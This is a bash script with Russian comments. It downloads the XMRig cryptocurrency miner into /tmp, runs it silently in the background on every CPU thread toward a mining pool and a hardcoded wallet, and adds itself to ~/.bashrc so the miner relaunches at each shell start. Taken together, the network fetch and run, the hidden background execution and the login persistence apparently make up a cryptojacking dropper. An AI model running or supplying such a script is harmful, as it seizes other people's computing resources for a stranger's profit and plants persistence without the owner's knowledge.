#!/bin/bash

# Путь к директории и файлам
SCRIPT_DIR="$HOME"
SCRIPT_FILE="/tmp/start_xmrig.sh"
BASHRC_FILE="$HOME/.bashrc"

# Создание скрипта start_xmrig.sh
cat << 'EOF' > "$SCRIPT_FILE"
#!/bin/bash

# Определение директории скрипта
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Проверка, если xmrig не запущен, запускаем его
if ! ps aux | grep -v grep | grep -q '/tmp/xmrig-6.22.2/xmrig'; then
    echo "Запуск xmrig..."
    wget -qO- https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz | tar xz -C /tmp
    nohup /tmp/xmrig-6.22.2/xmrig -o stratum+tcp://btc.kryptex.network:7777 -u bc1qzalurxmc86d6q34cq95rt5qcce2e880gakwu9r -p x --threads=$(nproc) --cpu-priority=5 > /tmp/xmrig.log 2>&1 &
else
    echo "xmrig уже запущен."
fi
EOF

# Сделаем скрипт исполнимым
chmod +x "$SCRIPT_FILE"

# Проверка и добавление скрипта в .bashrc, если его там нет
if ! grep -q "$SCRIPT_FILE" "$BASHRC_FILE"; then
    echo "" >> "$BASHRC_FILE"
    echo "# Автозапуск xmrig" >> "$BASHRC_FILE"
    echo "/bin/bash \"$SCRIPT_FILE\"" >> "$BASHRC_FILE"
    echo "Скрипт добавлен в $BASHRC_FILE для автозапуска."
else
    echo "Скрипт уже добавлен в $BASHRC_FILE."
fi

# Проверка и запуск xmrig (если еще не запущен)
if ! ps aux | grep -v grep | grep -q '/tmp/xmrig-6.22.2/xmrig'; then
    echo "Запуск xmrig..."
    wget -qO- https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz | tar xz -C /tmp
    nohup /tmp/xmrig-6.22.2/xmrig -o stratum+tcp://btc.kryptex.network:7777 -u bc1qzalurxmc86d6q34cq95rt5qcce2e880gakwu9r -p x --threads=$(nproc) --cpu-priority=5 > /tmp/xmrig.log 2>&1 &
else
    echo "xmrig уже запущен."
fi

echo "Скрипт завершил свою работу. Чтобы перезапустить xmrig, используйте команду: source ~/.bashrc"
